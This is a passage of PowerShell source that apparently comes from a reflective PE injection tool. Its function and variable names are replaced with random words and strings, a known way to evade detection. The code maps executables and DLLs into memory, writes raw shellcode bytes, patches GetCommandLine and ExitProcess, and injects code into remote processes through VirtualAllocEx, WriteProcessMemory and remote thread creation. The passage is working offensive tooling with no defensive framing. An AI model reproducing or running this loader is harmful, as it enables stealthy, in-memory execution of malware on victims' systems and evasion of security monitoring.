        $Win32Constants,
        
        [Parameter(Position = 3, Mandatory = $true)]
        [System.Object]
        $EdirUAaY99
        )
        
        for( $i = 0; $i -lt $PEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++)
        {
            [IntPtr]$ziQXfthb99 = [IntPtr](Ute ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$EdirUAaY99.IMAGE_SECTION_HEADER)))
            $UVyGHszM99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ziQXfthb99, [Type]$EdirUAaY99.IMAGE_SECTION_HEADER)
            [IntPtr]$WQXeZnSl99 = Ute ($PEInfo.PEHandle) ($UVyGHszM99.VirtualAddress)
            
            [UInt32]$vlCcMyYy99 = Pasadena $UVyGHszM99.Characteristics
            [UInt32]$YFaEPHvk99 = $UVyGHszM99.VirtualSize
            
            [UInt32]$CnVPagPC99 = 0
            commemorative -QkQUtuMd99 "provides::VirtualProtect" -PEInfo $PEInfo -StartAddress $WQXeZnSl99 -Size $YFaEPHvk99 | Out-Null
            $OIWYYWxv99 = $iAJTLnuo99.VirtualProtect.Invoke($WQXeZnSl99, $YFaEPHvk99, $vlCcMyYy99, [Ref]$CnVPagPC99)
            if ($OIWYYWxv99 -eq $false)
            {
                Throw "Unable to change memory protection"
            }
        }
    }
    
    Function surplice
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [System.Object]
        $PEInfo,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $iAJTLnuo99,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Constants,
        
        [Parameter(Position = 3, Mandatory = $true)]
        [String]
        $wJPrnpqL99,
        
        [Parameter(Position = 4, Mandatory = $true)]
        [IntPtr]
        $GNxpbnWd99
        )
        
        $vMVOyWHp99 = @() 
        
        $oibAVeZV99 = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
        [UInt32]$CnVPagPC99 = 0
        
        [IntPtr]$geEPvBuJ99 = $iAJTLnuo99.GetModuleHandle.Invoke("Kernel32.dll")
        if ($geEPvBuJ99 -eq [IntPtr]::Zero)
        {
            throw "Kernel32 handle null"
        }
        
        [IntPtr]$aYbiRmxc99 = $iAJTLnuo99.GetModuleHandle.Invoke("KernelBase.dll")
        if ($aYbiRmxc99 -eq [IntPtr]::Zero)
        {
            throw "KernelBase handle null"
        }
        $crTDfXMZ99 = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($wJPrnpqL99)
        $OxiXMYqK99 = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($wJPrnpqL99)
    
        [IntPtr]$gxhRormE99 = $iAJTLnuo99.GetProcAddress.Invoke($aYbiRmxc99, "GetCommandLineA")
        [IntPtr]$PiYYIMiU99 = $iAJTLnuo99.GetProcAddress.Invoke($aYbiRmxc99, "GetCommandLineW")
        if ($gxhRormE99 -eq [IntPtr]::Zero -or $PiYYIMiU99 -eq [IntPtr]::Zero)
        {
            throw "GetCommandLine ptr null. GetCommandLineA: $gxhRormE99. GetCommandLineW: $PiYYIMiU99"
        }
        [Byte[]]$MtXHodkb99 = @()
        if ($oibAVeZV99 -eq 8)
        {
            $MtXHodkb99 += 0x48 #64bit shellcode has the 0x48 before the 0xb8
        }
        $MtXHodkb99 += 0xb8
        
        [Byte[]]$BeSLAaUI99 = @(0xc3)
        $ltdPfOEL99 = $MtXHodkb99.Length + $oibAVeZV99 + $BeSLAaUI99.Length
        
        
        $izcHMSwU99 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($ltdPfOEL99)
        $gmtxduBl99 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($ltdPfOEL99)
        $iAJTLnuo99.memcpy.Invoke($izcHMSwU99, $gxhRormE99, [UInt64]$ltdPfOEL99) | Out-Null
        $iAJTLnuo99.memcpy.Invoke($gmtxduBl99, $PiYYIMiU99, [UInt64]$ltdPfOEL99) | Out-Null
        $vMVOyWHp99 += ,($gxhRormE99, $izcHMSwU99, $ltdPfOEL99)
        $vMVOyWHp99 += ,($PiYYIMiU99, $gmtxduBl99, $ltdPfOEL99)
        [UInt32]$CnVPagPC99 = 0
        $OIWYYWxv99 = $iAJTLnuo99.VirtualProtect.Invoke($gxhRormE99, [UInt32]$ltdPfOEL99, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$CnVPagPC99)
        if ($OIWYYWxv99 = $false)
        {
            throw "Call to VirtualProtect failed"
        }
        
        $QTqGdNAX99 = $gxhRormE99
        bashfully -Bytes $MtXHodkb99 -cLHURWJZ99 $QTqGdNAX99
        $QTqGdNAX99 = Ute $QTqGdNAX99 ($MtXHodkb99.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($OxiXMYqK99, $QTqGdNAX99, $false)
        $QTqGdNAX99 = Ute $QTqGdNAX99 $oibAVeZV99
        bashfully -Bytes $BeSLAaUI99 -cLHURWJZ99 $QTqGdNAX99
        
        $iAJTLnuo99.VirtualProtect.Invoke($gxhRormE99, [UInt32]$ltdPfOEL99, [UInt32]$CnVPagPC99, [Ref]$CnVPagPC99) | Out-Null
        
        
        [UInt32]$CnVPagPC99 = 0
        $OIWYYWxv99 = $iAJTLnuo99.VirtualProtect.Invoke($PiYYIMiU99, [UInt32]$ltdPfOEL99, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$CnVPagPC99)
        if ($OIWYYWxv99 = $false)
        {
            throw "Call to VirtualProtect failed"
        }
        
        $eUxoqegY99 = $PiYYIMiU99
        bashfully -Bytes $MtXHodkb99 -cLHURWJZ99 $eUxoqegY99
        $eUxoqegY99 = Ute $eUxoqegY99 ($MtXHodkb99.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($crTDfXMZ99, $eUxoqegY99, $false)
        $eUxoqegY99 = Ute $eUxoqegY99 $oibAVeZV99
        bashfully -Bytes $BeSLAaUI99 -cLHURWJZ99 $eUxoqegY99
        
        $iAJTLnuo99.VirtualProtect.Invoke($PiYYIMiU99, [UInt32]$ltdPfOEL99, [UInt32]$CnVPagPC99, [Ref]$CnVPagPC99) | Out-Null
        
        
        $KAVTBExA99 = @("msvcr70d.dll", "msvcr71d.dll", "msvcr80d.dll", "msvcr90d.dll", "msvcr100d.dll", "msvcr110d.dll", "msvcr70.dll" `
            , "msvcr71.dll", "msvcr80.dll", "msvcr90.dll", "msvcr100.dll", "msvcr110.dll")
        
        foreach ($Dll in $KAVTBExA99)
        {
            [IntPtr]$KfcbJnMI99 = $iAJTLnuo99.GetModuleHandle.Invoke($Dll)
            if ($KfcbJnMI99 -ne [IntPtr]::Zero)
            {
                [IntPtr]$yZYjWyGV99 = $iAJTLnuo99.GetProcAddress.Invoke($KfcbJnMI99, "_wcmdln")
                [IntPtr]$adTzjjRP99 = $iAJTLnuo99.GetProcAddress.Invoke($KfcbJnMI99, "_acmdln")
                if ($yZYjWyGV99 -eq [IntPtr]::Zero -or $adTzjjRP99 -eq [IntPtr]::Zero)
                {
                    "Error, couldn't find _wcmdln or _acmdln"
                }
                
                $KwNUDzKk99 = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($wJPrnpqL99)
                $zhTBrwJw99 = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($wJPrnpqL99)
                
                $OrfPhVST99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($adTzjjRP99, [Type][IntPtr])
                $HzbzFPvH99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($yZYjWyGV99, [Type][IntPtr])
                $MXEkIuKx99 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($oibAVeZV99)
                $twetZNxT99 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($oibAVeZV99)
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($OrfPhVST99, $MXEkIuKx99, $false)
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($HzbzFPvH99, $twetZNxT99, $false)
                $vMVOyWHp99 += ,($adTzjjRP99, $MXEkIuKx99, $oibAVeZV99)
                $vMVOyWHp99 += ,($yZYjWyGV99, $twetZNxT99, $oibAVeZV99)
                
                $OIWYYWxv99 = $iAJTLnuo99.VirtualProtect.Invoke($adTzjjRP99, [UInt32]$oibAVeZV99, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$CnVPagPC99)
                if ($OIWYYWxv99 = $false)
                {
                    throw "Call to VirtualProtect failed"
                }
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($KwNUDzKk99, $adTzjjRP99, $false)
                $iAJTLnuo99.VirtualProtect.Invoke($adTzjjRP99, [UInt32]$oibAVeZV99, [UInt32]($CnVPagPC99), [Ref]$CnVPagPC99) | Out-Null
                
                $OIWYYWxv99 = $iAJTLnuo99.VirtualProtect.Invoke($yZYjWyGV99, [UInt32]$oibAVeZV99, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$CnVPagPC99)
                if ($OIWYYWxv99 = $false)
                {
                    throw "Call to VirtualProtect failed"
                }
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($zhTBrwJw99, $yZYjWyGV99, $false)
                $iAJTLnuo99.VirtualProtect.Invoke($yZYjWyGV99, [UInt32]$oibAVeZV99, [UInt32]($CnVPagPC99), [Ref]$CnVPagPC99) | Out-Null
            }
        }
        
        
        $vMVOyWHp99 = @()
        $VTHAsROe99 = @() #Array of functions to overwrite so the thread doesn't exit the process
        
        [IntPtr]$PQJFyfoz99 = $iAJTLnuo99.GetModuleHandle.Invoke("mscoree.dll")
        if ($PQJFyfoz99 -eq [IntPtr]::Zero)
        {
            throw "mscoree handle null"
        }
        [IntPtr]$iMokYlgH99 = $iAJTLnuo99.GetProcAddress.Invoke($PQJFyfoz99, "CorExitProcess")
        if ($iMokYlgH99 -eq [IntPtr]::Zero)
        {
            Throw "CorExitProcess address not found"
        }
        $VTHAsROe99 += $iMokYlgH99
        
        [IntPtr]$xzqOvciI99 = $iAJTLnuo99.GetProcAddress.Invoke($geEPvBuJ99, "ExitProcess")
        if ($xzqOvciI99 -eq [IntPtr]::Zero)
        {
            Throw "ExitProcess address not found"
        }
        $VTHAsROe99 += $xzqOvciI99
        
        [UInt32]$CnVPagPC99 = 0
        foreach ($DqjjnrMx99 in $VTHAsROe99)
        {
            $fUbMdAIJ99 = $DqjjnrMx99
            [Byte[]]$MtXHodkb99 = @(0xbb)
            [Byte[]]$BeSLAaUI99 = @(0xc6, 0x03, 0x01, 0x83, 0xec, 0x20, 0x83, 0xe4, 0xc0, 0xbb)
            if ($oibAVeZV99 -eq 8)
            {
                [Byte[]]$MtXHodkb99 = @(0x48, 0xbb)
                [Byte[]]$BeSLAaUI99 = @(0xc6, 0x03, 0x01, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xbb)
            }
            [Byte[]]$hbqjzgbN99 = @(0xff, 0xd3)
            $ltdPfOEL99 = $MtXHodkb99.Length + $oibAVeZV99 + $BeSLAaUI99.Length + $oibAVeZV99 + $hbqjzgbN99.Length
            
            [IntPtr]$dCLQXwac99 = $iAJTLnuo99.GetProcAddress.Invoke($geEPvBuJ99, "ExitThread")
            if ($dCLQXwac99 -eq [IntPtr]::Zero)
            {
                Throw "ExitThread address not found"
            }
            $OIWYYWxv99 = $iAJTLnuo99.VirtualProtect.Invoke($DqjjnrMx99, [UInt32]$ltdPfOEL99, [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]$CnVPagPC99)
            if ($OIWYYWxv99 -eq $false)
            {
                Throw "Call to VirtualProtect failed"
            }
            
            $nqTkuDQV99 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($ltdPfOEL99)
            $iAJTLnuo99.memcpy.Invoke($nqTkuDQV99, $DqjjnrMx99, [UInt64]$ltdPfOEL99) | Out-Null
            $vMVOyWHp99 += ,($DqjjnrMx99, $nqTkuDQV99, $ltdPfOEL99)
            
            bashfully -Bytes $MtXHodkb99 -cLHURWJZ99 $fUbMdAIJ99
            $fUbMdAIJ99 = Ute $fUbMdAIJ99 ($MtXHodkb99.Length)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($GNxpbnWd99, $fUbMdAIJ99, $false)
            $fUbMdAIJ99 = Ute $fUbMdAIJ99 $oibAVeZV99
            bashfully -Bytes $BeSLAaUI99 -cLHURWJZ99 $fUbMdAIJ99
            $fUbMdAIJ99 = Ute $fUbMdAIJ99 ($BeSLAaUI99.Length)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($dCLQXwac99, $fUbMdAIJ99, $false)
            $fUbMdAIJ99 = Ute $fUbMdAIJ99 $oibAVeZV99
            bashfully -Bytes $hbqjzgbN99 -cLHURWJZ99 $fUbMdAIJ99
            $iAJTLnuo99.VirtualProtect.Invoke($DqjjnrMx99, [UInt32]$ltdPfOEL99, [UInt32]$CnVPagPC99, [Ref]$CnVPagPC99) | Out-Null
        }
        Write-Output $vMVOyWHp99
    }
    
    
    Function Thursday
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [Array[]]
        $ihBKszKt99,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $iAJTLnuo99,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Constants
        )
        [UInt32]$CnVPagPC99 = 0
        foreach ($Info in $ihBKszKt99)
        {
            $OIWYYWxv99 = $iAJTLnuo99.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]$CnVPagPC99)
            if ($OIWYYWxv99 -eq $false)
            {
                Throw "Call to VirtualProtect failed"
            }
            
            $iAJTLnuo99.memcpy.Invoke($Info[0], $Info[1], [UInt64]$Info[2]) | Out-Null
            
            $iAJTLnuo99.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$CnVPagPC99, [Ref]$CnVPagPC99) | Out-Null
        }
    }
    Function driveway
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [IntPtr]
        $KspyWyNs99,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [String]
        $FunctionName
        )
        
        $EdirUAaY99 = Canberra
        $Win32Constants = Thursdays
        $PEInfo = unofficially -KspyWyNs99 $KspyWyNs99 -EdirUAaY99 $EdirUAaY99 -Win32Constants $Win32Constants
        
        if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.Size -eq 0)
        {
            return [IntPtr]::Zero
        }
        $zUmqQyNt99 = Ute ($KspyWyNs99) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.VirtualAddress)
        $xtWGrHwy99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($zUmqQyNt99, [Type]$EdirUAaY99.IMAGE_EXPORT_DIRECTORY)
        
        for ($i = 0; $i -lt $xtWGrHwy99.NumberOfNames; $i++)
        {
            $JFEJqwqU99 = Ute ($KspyWyNs99) ($xtWGrHwy99.AddressOfNames + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
            $QVpVBcay99 = Ute ($KspyWyNs99) ([System.Runtime.InteropServices.Marshal]::PtrToStructure($JFEJqwqU99, [Type][UInt32]))
            $Name = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($QVpVBcay99)
            if ($Name -ceq $FunctionName)
            {
                $TeeZweIL99 = Ute ($KspyWyNs99) ($xtWGrHwy99.AddressOfNameOrdinals + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16])))
                $ORXUGhPo99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TeeZweIL99, [Type][UInt16])
                $zPjsKzvo99 = Ute ($KspyWyNs99) ($xtWGrHwy99.AddressOfFunctions + ($ORXUGhPo99 * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
                $iLAJcdgJ99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($zPjsKzvo99, [Type][UInt32])
                return Ute ($KspyWyNs99) ($iLAJcdgJ99)
            }
        }
        
        return [IntPtr]::Zero
    }
    Function facial
    {
        Param(
        [Parameter( Position = 0, Mandatory = $true )]
        [Byte[]]
        $xyBDLqMD99,
        
        [Parameter(Position = 1, Mandatory = $false)]
        [String]
        $ZfBwWbof99,
        
        [Parameter(Position = 2, Mandatory = $false)]
        [IntPtr]
        $lFbCkSOL99
        )
        
        $oibAVeZV99 = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
        
        $Win32Constants = Thursdays
        $iAJTLnuo99 = illustrate
        $EdirUAaY99 = Canberra
        
        $IzqzBWUw99 = $false
        if (($lFbCkSOL99 -ne $null) -and ($lFbCkSOL99 -ne [IntPtr]::Zero))
        {
            $IzqzBWUw99 = $true
        }
        
        Write-Verbose "Getting basic PE information from the file"
        $PEInfo = cherubim -xyBDLqMD99 $xyBDLqMD99 -EdirUAaY99 $EdirUAaY99
        $CyQKpuSs99 = $PEInfo.OriginalImageBase
        $QYSFfweh99 = $true
        if (([Int] $PEInfo.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT) -ne $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT)
        {
            Write-Warning "PE is not compatible with DEP, might cause issues" -WarningAction Continue
            $QYSFfweh99 = $false
        }
        
        
        $ltLtfIrA99 = $true
        if ($IzqzBWUw99 -eq $true)
        {
            $geEPvBuJ99 = $iAJTLnuo99.GetModuleHandle.Invoke("kernel32.dll")
            $uaKDlBLQ99 = $iAJTLnuo99.GetProcAddress.Invoke($geEPvBuJ99, "IsWow64Process")
            if ($uaKDlBLQ99 -eq [IntPtr]::Zero)
            {
                Throw "Couldn't locate IsWow64Process function to determine if target process is 32bit or 64bit"
            }
            
            [Bool]$zgEGeVzt99 = $false
            $OIWYYWxv99 = $iAJTLnuo99.IsWow64Process.Invoke($lFbCkSOL99, [Ref]$zgEGeVzt99)
            if ($OIWYYWxv99 -eq $false)
            {
                Throw "Call to IsWow64Process failed"
            }
            
            if (($zgEGeVzt99 -eq $true) -or (($zgEGeVzt99 -eq $false) -and ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4)))
            {
                $ltLtfIrA99 = $false
            }
            
            $ddVZtURr99 = $true
            if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
            {
                $ddVZtURr99 = $false
            }
            if ($ddVZtURr99 -ne $ltLtfIrA99)
            {
                throw "PowerShell must be same architecture (x86/x64) as PE being loaded and remote process"
            }
        }
        else
        {
            if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
            {
                $ltLtfIrA99 = $false
            }
        }
        if ($ltLtfIrA99 -ne $PEInfo.PE64Bit)
        {
            Throw "PE platform doesn't match the architecture of the process it is being loaded in (32/64bit)"
        }
        
        Write-Verbose "Allocating memory for the PE and write its headers to memory"
        
        [IntPtr]$aZDZhVPF99 = [IntPtr]::Zero
        if (([Int] $PEInfo.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE) -ne $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE)
        {
            Write-Warning "PE file being reflectively loaded is not ASLR compatible. If the loading fails, try restarting PowerShell and trying again" -WarningAction Continue
            [IntPtr]$aZDZhVPF99 = $CyQKpuSs99
        }
        $KspyWyNs99 = [IntPtr]::Zero              #This is where the PE is allocated in PowerShell
        $LcPAREiP99 = [IntPtr]::Zero     #This is the address the PE will be loaded to. If it is loaded in PowerShell, this equals $KspyWyNs99. If it is loaded in a remote process, this is the address in the remote process.
        if ($IzqzBWUw99 -eq $true)
        {
            $KspyWyNs99 = $iAJTLnuo99.VirtualAlloc.Invoke([IntPtr]::Zero, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
            
            $LcPAREiP99 = $iAJTLnuo99.VirtualAllocEx.Invoke($lFbCkSOL99, $aZDZhVPF99, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
            if ($LcPAREiP99 -eq [IntPtr]::Zero)
            {
                Throw "Unable to allocate memory in the remote process. If the PE being loaded doesn't support ASLR, it could be that the requested base address of the PE is already in use"
            }
        }
        else
        {
            if ($QYSFfweh99 -eq $true)
            {
                $KspyWyNs99 = $iAJTLnuo99.VirtualAlloc.Invoke($aZDZhVPF99, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
            }
            else
            {
                $KspyWyNs99 = $iAJTLnuo99.VirtualAlloc.Invoke($aZDZhVPF99, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
            }
            $LcPAREiP99 = $KspyWyNs99
        }
        
        [IntPtr]$kGmlzGyh99 = Ute ($KspyWyNs99) ([Int64]$PEInfo.SizeOfImage)
        if ($KspyWyNs99 -eq [IntPtr]::Zero)
        { 
            Throw "VirtualAlloc failed to allocate memory for PE. If PE is not ASLR compatible, try running the script in a new PowerShell process (the new PowerShell process will have a different memory layout, so the address the PE wants might be free)."
        }       
        [System.Runtime.InteropServices.Marshal]::Copy($xyBDLqMD99, 0, $KspyWyNs99, $PEInfo.SizeOfHeaders) | Out-Null
        
        
        Write-Verbose "Getting detailed PE information from the headers loaded in memory"
        $PEInfo = unofficially -KspyWyNs99 $KspyWyNs99 -EdirUAaY99 $EdirUAaY99 -Win32Constants $Win32Constants
        $PEInfo | Add-Member -MemberType NoteProperty -Name EndAddress -Value $kGmlzGyh99
        $PEInfo | Add-Member -MemberType NoteProperty -Name EffectivePEHandle -Value $LcPAREiP99
        Write-Verbose "StartAddress: $KspyWyNs99    EndAddress: $kGmlzGyh99"
        
        
        Write-Verbose "Copy PE sections in to memory"
        spoor -xyBDLqMD99 $xyBDLqMD99 -PEInfo $PEInfo -iAJTLnuo99 $iAJTLnuo99 -EdirUAaY99 $EdirUAaY99
        
        
        Write-Verbose "Update memory addresses based on where the PE was actually loaded in memory"
        Green -PEInfo $PEInfo -CyQKpuSs99 $CyQKpuSs99 -Win32Constants $Win32Constants -EdirUAaY99 $EdirUAaY99
        
        Write-Verbose "Import DLL's needed by the PE we are loading"
        if ($IzqzBWUw99 -eq $true)
        {
            obstructiveness -PEInfo $PEInfo -iAJTLnuo99 $iAJTLnuo99 -EdirUAaY99 $EdirUAaY99 -Win32Constants $Win32Constants -lFbCkSOL99 $lFbCkSOL99
        }
        else
        {
            obstructiveness -PEInfo $PEInfo -iAJTLnuo99 $iAJTLnuo99 -EdirUAaY99 $EdirUAaY99 -Win32Constants $Win32Constants
        }
        
        
        if ($IzqzBWUw99 -eq $false)
        {
            if ($QYSFfweh99 -eq $true)
            {
                Write-Verbose "Update memory protection flags"
                provides -PEInfo $PEInfo -iAJTLnuo99 $iAJTLnuo99 -Win32Constants $Win32Constants -EdirUAaY99 $EdirUAaY99
            }
            else
            {
                Write-Verbose "PE being reflectively loaded is not compatible with NX memory, keeping memory as read write execute"
            }
        }
        else
        {
            Write-Verbose "PE being loaded in to a remote process, not adjusting memory permissions"
        }
        
        
        if ($IzqzBWUw99 -eq $true)
        {
            [UInt32]$EAWVzaoc99 = 0
            $OIWYYWxv99 = $iAJTLnuo99.WriteProcessMemory.Invoke($lFbCkSOL99, $LcPAREiP99, $KspyWyNs99, [UIntPtr]($PEInfo.SizeOfImage), [Ref]$EAWVzaoc99)
            if ($OIWYYWxv99 -eq $false)
            {
                Throw "Unable to write shellcode to remote process memory."
            }
        }
        
        
        if ($PEInfo.FileType -ieq "DLL")
        {
            if ($IzqzBWUw99 -eq $false)
            {
                Write-Verbose "Calling dllmain so the DLL knows it has been loaded"
                $vUvjXIAy99 = Ute ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
                $slPWlPdP99 = invoke @([IntPtr], [UInt32], [IntPtr]) ([Bool])
                $mLAWFiyE99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($vUvjXIAy99, $slPWlPdP99)
                
                $mLAWFiyE99.Invoke($PEInfo.PEHandle, 1, [IntPtr]::Zero) | Out-Null
            }
            else
            {
                $vUvjXIAy99 = Ute ($LcPAREiP99) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
            
                if ($PEInfo.PE64Bit -eq $true)
                {
                    $HOxzHYtB99 = @(0x53, 0x48, 0x89, 0xe3, 0x66, 0x83, 0xe4, 0x00, 0x48, 0xb9)
                    $alltMjsY99 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0x41, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x48, 0xb8)
                    $wUVfjiuF99 = @(0xff, 0xd0, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
                }
                else
                {
                    $HOxzHYtB99 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xf0, 0xb9)
                    $alltMjsY99 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x50, 0x52, 0x51, 0xb8)
                    $wUVfjiuF99 = @(0xff, 0xd0, 0x89, 0xdc, 0x5b, 0xc3)
                }
                $dNRVnNXQ99 = $HOxzHYtB99.Length + $alltMjsY99.Length + $wUVfjiuF99.Length + ($oibAVeZV99 * 2)
                $EAgFmezT99 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($dNRVnNXQ99)
                $zQtagwHZ99 = $EAgFmezT99
                
                bashfully -Bytes $HOxzHYtB99 -cLHURWJZ99 $EAgFmezT99
                $EAgFmezT99 = Ute $EAgFmezT99 ($HOxzHYtB99.Length)
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($LcPAREiP99, $EAgFmezT99, $false)
                $EAgFmezT99 = Ute $EAgFmezT99 ($oibAVeZV99)
                bashfully -Bytes $alltMjsY99 -cLHURWJZ99 $EAgFmezT99
                $EAgFmezT99 = Ute $EAgFmezT99 ($alltMjsY99.Length)
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($vUvjXIAy99, $EAgFmezT99, $false)
                $EAgFmezT99 = Ute $EAgFmezT99 ($oibAVeZV99)
                bashfully -Bytes $wUVfjiuF99 -cLHURWJZ99 $EAgFmezT99
                $EAgFmezT99 = Ute $EAgFmezT99 ($wUVfjiuF99.Length)
                
                $NkAiMBRi99 = $iAJTLnuo99.VirtualAllocEx.Invoke($lFbCkSOL99, [IntPtr]::Zero, [UIntPtr][UInt64]$dNRVnNXQ99, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
                if ($NkAiMBRi99 -eq [IntPtr]::Zero)
                {
                    Throw "Unable to allocate memory in the remote process for shellcode"
                }
                
                $OIWYYWxv99 = $iAJTLnuo99.WriteProcessMemory.Invoke($lFbCkSOL99, $NkAiMBRi99, $zQtagwHZ99, [UIntPtr][UInt64]$dNRVnNXQ99, [Ref]$EAWVzaoc99)
                if (($OIWYYWxv99 -eq $false) -or ([UInt64]$EAWVzaoc99 -ne [UInt64]$dNRVnNXQ99))
                {
                    Throw "Unable to write shellcode to remote process memory."
                }
                $TUBSeZNh99 = aggravation -eXFgjlah99 $lFbCkSOL99 -StartAddress $NkAiMBRi99 -iAJTLnuo99 $iAJTLnuo99
                $uaKDlBLQ99 = $iAJTLnuo99.WaitForSingleObject.Invoke($TUBSeZNh99, 20000)
                if ($uaKDlBLQ99 -ne 0)
                {
                    Throw "Call to CreateRemoteThread to call GetProcAddress failed."
                }
                
                $iAJTLnuo99.VirtualFreeEx.Invoke($lFbCkSOL99, $NkAiMBRi99, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
            }
        }
        elseif ($PEInfo.FileType -ieq "EXE")
        {
            [IntPtr]$GNxpbnWd99 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(1)
            [System.Runtime.InteropServices.Marshal]::WriteByte($GNxpbnWd99, 0, 0x00)
            $YhsqdogM99 = surplice -PEInfo $PEInfo -iAJTLnuo99 $iAJTLnuo99 -Win32Constants $Win32Constants -wJPrnpqL99 $ZfBwWbof99 -GNxpbnWd99 $GNxpbnWd99
            [IntPtr]$itgIKjEW99 = Ute ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
            Write-Verbose "Call EXE Main function. Address: $itgIKjEW99. Creating thread for the EXE to run in."
            $iAJTLnuo99.CreateThread.Invoke([IntPtr]::Zero, [IntPtr]::Zero, $itgIKjEW99, [IntPtr]::Zero, ([UInt32]0), [Ref]([UInt32]0)) | Out-Null
            while($true)
            {
                [Byte]$gQvzhEcq99 = [System.Runtime.InteropServices.Marshal]::ReadByte($GNxpbnWd99, 0)
                if ($gQvzhEcq99 -eq 1)
                {
                    Thursday -ihBKszKt99 $YhsqdogM99 -iAJTLnuo99 $iAJTLnuo99 -Win32Constants $Win32Constants
                    Write-Verbose "EXE thread has completed."
                    break
                }
                else
                {
                    Start-Sleep -Seconds 1
                }
            }
        }
        
        return @($PEInfo.PEHandle, $LcPAREiP99)
    }
    
    
    Function crimsons
    {
        Param(
        [Parameter(Position=0, Mandatory=$true)]
        [IntPtr]
        $KspyWyNs99
        )
        
        $Win32Constants = Thursdays
        $iAJTLnuo99 = illustrate
        $EdirUAaY99 = Canberra
        
